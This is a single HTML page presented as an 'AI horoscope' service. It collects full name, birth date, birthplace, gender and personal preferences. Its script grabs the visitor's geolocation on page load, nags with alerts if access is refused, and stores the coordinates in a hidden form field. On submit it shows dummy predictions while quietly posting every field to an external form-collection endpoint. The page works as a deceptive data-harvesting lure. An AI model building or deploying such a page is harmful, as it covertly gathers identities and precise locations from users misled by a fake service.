<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Astra - AI Horoscope</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #fff;
      color: #222;
    }

    .hero {
      width: 100%;
      max-width: 480px;
      margin: 0 auto;
    }

    .hero img {
      width: 100%;
      display: block;
    }

    .section {
      padding: 1.5rem;
      text-align: center;
    }

    .heading {
      font-size: 2rem;
      font-weight: 300;
      margin-bottom: 1rem;
      color: #DAA520;
    }

    form {
      display: flex;
      flex-direction: column;
      max-width: 400px;
      margin: 0 auto;
    }

    input, select {
      padding: 0.8rem;
      margin: 0.6rem 0;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 1rem;
    }

    button {
      padding: 1rem;
      font-size: 1.1rem;
      background-color: #F4A300;
      color: #000;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #e29400;
    }

    #result {
      margin-top: 1.5rem;
      font-size: 1.1rem;
      color: green;
    }
  </style>
</head>
<body>

  <div class="hero">
    <img src="https://envs.sh/kzl.jpg" alt="Astra UI">
  </div>

  <div class="section">
    <div class="heading">WE CAN predict you</div>

    <form id="astroForm">
      <input type="text" name="name" id="name" placeholder="Your Full Name" required>
      <input type="date" name="dob" placeholder="Date of Birth" required>
      <input type="text" name="birthplace" placeholder="Place of Birth" required>
      <select name="gender" required>
        <option value="" disabled selected>Select Gender</option>
        <option value="male">Male</option>
        <option value="female">Female</option>
        <option value="other">Other</option>
      </select>
      <input type="text" name="favorites" placeholder="Your Favorite Things" required>
      <input type="hidden" name="location" id="location">
      <button type="submit">Free Check now</button>
    </form>

    <div id="result"></div>
  </div>

  <script>
    // Dummy prediction list
    const predictionData = {
      "Rahul Sharma": "You are full of energy today. A surprise is waiting for you!",
      "Priya Das": "Your calm nature will help you win a small conflict this week.",
      "Ajay Kumar": "You may receive good news related to career growth."
    };

    // Get location if allowed
    window.onload = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const loc = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
            document.getElementById('location').value = loc;
          },
          (err) => {
            alert("Please allow location access to use this feature.");
          }
        );
      } else {
        alert("Geolocation is not supported in your browser.");
      }
    };

    document.getElementById('astroForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const form = e.target;
      const name = form.name.value.trim();
      const result = document.getElementById("result");

      // Show prediction if name exists
      if (predictionData[name]) {
        result.innerText = predictionData[name];
      } else {
        result.innerText = "Thank you! We will notify you with your prediction soon.";
      }

      // Send form to Getform
      const formData = new FormData(form);
      fetch("https://getform.io/f/allyroma", {
        method: "POST",
        body: formData
      });
    });
  </script>

</body>
</html>
